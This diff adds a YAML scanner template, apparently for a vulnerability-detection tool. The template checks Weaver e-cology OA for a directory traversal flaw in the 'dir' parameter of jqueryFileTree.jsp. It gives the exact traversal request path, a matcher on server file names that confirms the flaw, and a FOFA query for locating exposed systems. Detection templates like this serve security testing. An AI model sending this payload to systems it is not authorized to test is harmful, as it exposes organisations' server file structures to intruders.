@@ -1,0 +1,24 @@
+id: ecology-jqueryfiletree-directory-traversal
+
+info:
+  name: 泛微OA E-Cology jqueryFileTree.jsp 目录遍历漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    泛微e-cology是专为大中型企业制作的OA办公系统,支持PC端、移动端和微信端同时办公等，其中 jqueryFileTree.jsp 文件中 dir 参数存在目录遍历漏洞，攻击者通过漏洞可以获取服务器文件目录信息
+    fofa: app="泛微-协同办公OA"
+  tags: weaver,ecology,directory-traversal
+  created: 2023/06/23
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /hrm/hrm_e9/orgChart/js/jquery/plugins/jqueryFileTree/connectors/jqueryFileTree.jsp?dir=/page/resource/userfile/../../
+    expression: |
+      response.status == 200 && 
+      response.body.bcontains(b'index.jsp') && 
+      response.body.bcontains(b'PortalCenter.jsp') && 
+      response.body.bcontains(b'PortalSettingOperation.jsp')
+expression: r0()
